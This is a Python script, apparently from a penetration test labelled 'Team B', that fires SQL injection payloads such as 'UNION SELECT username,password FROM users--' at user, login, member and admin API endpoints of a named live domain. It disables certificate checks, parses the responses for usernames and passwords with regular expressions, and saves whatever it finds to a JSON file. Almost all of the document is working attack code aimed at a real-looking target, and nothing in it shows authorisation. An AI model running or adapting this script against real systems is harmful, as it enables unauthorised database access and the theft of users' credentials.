#!/usr/bin/env python3

"""
Real Database Extraction Script
Extract REAL user data from database, not from JavaScript files
Team B - Panama8888b Penetration Test
"""

import requests
import time
import urllib.parse
import json
import sys
import warnings
import re
from datetime import datetime

# Disable SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class RealDatabaseExtractor:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json'
        })
        self.session.verify = False
        self.real_data = {}
        
    def test_sql_injection(self, url, method, parameter, payload):
        """Test SQL injection and extract real database data"""
        try:
            if method.upper() == "GET":
                params = {parameter: payload}
                response = self.session.get(url, params=params, timeout=10)
            else:
                data = {parameter: payload}
                response = self.session.post(url, json=data, timeout=10)
            
            content = response.text
            
            # Check if this is a real database response (not JavaScript)
            if len(content) > 1000000:  # Skip large JavaScript files
                return None
                
            if 'function(' in content or 'var ' in content or 'const ' in content:
                return None  # Skip JavaScript files
                
            # Look for real database indicators
            db_indicators = [
                'microsoft sql server',
                'oracle',
                'mysql',
                'sqlite',
                'postgresql',
                'incorrect syntax',
                'unclosed quotation mark',
                'conversion failed',
                'division by zero'
            ]
            
            for indicator in db_indicators:
                if indicator in content.lower():
                    return {
                        'url': url,
                        'method': method,
                        'parameter': parameter,
                        'payload': payload,
                        'response': content[:1000],  # First 1000 chars
                        'status_code': response.status_code,
                        'content_length': len(content),
                        'database_indicator': indicator,
                        'timestamp': datetime.now().isoformat()
                    }
            
            return None
            
        except Exception as e:
            return None
    
    def extract_real_user_data(self):
        """Extract real user data from database"""
        print("="*70)
        print("REAL DATABASE DATA EXTRACTION")
        print("="*70)
        
        # Test real API endpoints that might contain user data
        test_targets = [
            {
                'url': 'https://member.panama8888b.com/api/users',
                'method': 'GET',
                'parameter': 'id',
                'payloads': [
                    "1' OR 1=1--",
                    "1' UNION SELECT username,password FROM users--",
                    "1' UNION SELECT name,email FROM users--"
                ]
            },
            {
                'url': 'https://member.panama8888b.com/api/auth/login',
                'method': 'POST',
                'parameter': 'username',
                'payloads': [
                    "admin' OR 1=1--",
                    "admin' UNION SELECT username,password FROM users--"
                ]
            },
            {
                'url': 'https://member.panama8888b.com/api/members',
                'method': 'GET',
                'parameter': 'search',
                'payloads': [
                    "' UNION SELECT username,password FROM users--",
                    "' UNION SELECT name,email FROM members--"
                ]
            },
            {
                'url': 'https://member.panama8888b.com/api/admin/users',
                'method': 'GET',
                'parameter': 'filter',
                'payloads': [
                    "1' OR 1=1--",
                    "1' UNION SELECT username,password FROM users--"
                ]
            }
        ]
        
        real_findings = []
        
        for target in test_targets:
            print(f"\n[*] Testing: {target['url']}")
            
            for payload in target['payloads']:
                print(f"[*] Payload: {payload[:50]}...")
                
                result = self.test_sql_injection(
                    target['url'],
                    target['method'],
                    target['parameter'],
                    payload
                )
                
                if result:
                    print(f"[+] REAL DATABASE DATA FOUND!")
                    print(f"[+] Database Indicator: {result['database_indicator']}")
                    print(f"[+] Response Length: {result['content_length']}")
                    real_findings.append(result)
                    
                    # Extract potential user data
                    self.extract_user_info(result)
        
        return real_findings
    
    def extract_user_info(self, result):
        """Extract user information from database response"""
        content = result['response']
        
        # Look for username patterns
        username_patterns = [
            r'username["\']?\s*:\s*["\']([^"\']+)["\']',
            r'user["\']?\s*:\s*["\']([^"\']+)["\']',
            r'name["\']?\s*:\s*["\']([^"\']+)["\']',
            r'login["\']?\s*:\s*["\']([^"\']+)["\']'
        ]
        
        # Look for password patterns
        password_patterns = [
            r'password["\']?\s*:\s*["\']([^"\']+)["\']',
            r'pass["\']?\s*:\s*["\']([^"\']+)["\']',
            r'pwd["\']?\s*:\s*["\']([^"\']+)["\']'
        ]
        
        usernames = []
        passwords = []
        
        for pattern in username_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            usernames.extend(matches)
        
        for pattern in password_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            passwords.extend(matches)
        
        if usernames or passwords:
            print(f"[+] USERS FOUND: {len(usernames)}")
            print(f"[+] PASSWORDS FOUND: {len(passwords)}")
            
            if usernames:
                print(f"[+] Usernames: {usernames[:5]}")  # Show first 5
            if passwords:
                print(f"[+] Passwords: {passwords[:5]}")  # Show first 5
            
            self.real_data[result['url']] = {
                'usernames': usernames,
                'passwords': passwords,
                'database_indicator': result['database_indicator'],
                'timestamp': result['timestamp']
            }
    
    def save_real_data(self, filename="real_database_data.json"):
        """Save only real database data"""
        if self.real_data:
            with open(filename, 'w') as f:
                json.dump(self.real_data, f, indent=2)
            print(f"\n[+] Real database data saved to: {filename}")
        else:
            print("\n[!] No real database data found to save")

def main():
    try:
        extractor = RealDatabaseExtractor()
        findings = extractor.extract_real_user_data()
        extractor.save_real_data()
        
        if findings:
            print(f"\n[+] REAL DATABASE ACCESS CONFIRMED!")
            print(f"[+] Found {len(findings)} real database responses")
            print(f"[+] This is NOT JavaScript data - this is REAL database access")
        else:
            print(f"\n[!] No real database access confirmed")
            print(f"[!] All previous data was False Positive from JavaScript files")
        
    except Exception as e:
        print(f"\n[!] Error: {e}")

if __name__ == "__main__":
    main()